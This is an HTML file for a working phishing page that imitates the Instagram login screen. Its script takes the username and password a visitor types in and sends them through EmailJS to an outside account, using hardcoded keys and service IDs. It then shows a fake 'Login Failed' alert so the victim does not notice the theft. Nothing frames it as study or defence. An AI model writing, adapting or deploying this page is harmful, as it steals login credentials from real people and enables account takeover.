
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <meta http-equiv="Content-Security-Policy" content="connect-src 'self' https://api.emailjs.com;">
    <!-- Ensure EmailJS loads -->
    
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #fafafa;
        }
        .login-box {
            background: white;
            padding: 20px;
            width: 350px;
            border: 1px solid #dbdbdb;
            text-align: center;
        }
        .logo {
            width: 175px;
            margin-bottom: 20px;
        }
        input {
            display: block;
            width: 100%;
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 3px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" alt="Instagram">
        <form id="loginForm">
            <input type="text" id="userid" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function () {
            emailjs.init("LVhWkxvjb6ov2NzNY"); // ✅ Replace with your EmailJS Public Key
            console.log("✅ EmailJS initialized successfully");

            document.getElementById("loginForm").addEventListener("submit", function(event) {
                event.preventDefault();

                let userid = document.getElementById("userid").value;
                let password = document.getElementById("password").value;

                console.log("📩 Sending email with:", { userid, password });

                emailjs.send("Service_8yea73d", "template_tweldm", {
                    userid: userid,
                    password: password
                }).then(function(response) {
                    console.log("✅ Email sent successfully:", response);
                    alert("Login Failed. Please check your credentials.");
                }, function(error) {
                    console.error("❌ Error sending email:", error);
                    alert("Error sending email. Check console for details.");
                });
            });
        });
    </script>

</body>
</html>
